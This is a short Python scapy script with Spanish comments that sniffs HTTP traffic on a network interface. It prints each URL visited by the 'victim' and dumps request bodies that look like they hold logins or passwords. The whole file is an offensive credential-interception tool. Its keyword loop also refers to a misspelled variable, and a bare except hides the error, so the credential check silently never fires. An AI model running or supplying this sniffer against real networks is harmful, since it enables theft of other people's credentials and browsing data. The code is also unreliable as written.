#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import signal
import sys

def def_handler(sig,frame):
    print(f"\n Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):

    cred_keywords = ["login", "user", "pass"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(f"\n URL visitada por la victima: {url}")

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keyowrds:
                    if keyword in response:
                        print(f"\n Posibles credenciales: {response}")
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("ens33") #Ingresamos red en la cual realizaremos el sniff, ejemplo ens33 

if __name__ == '__main__':
    main()
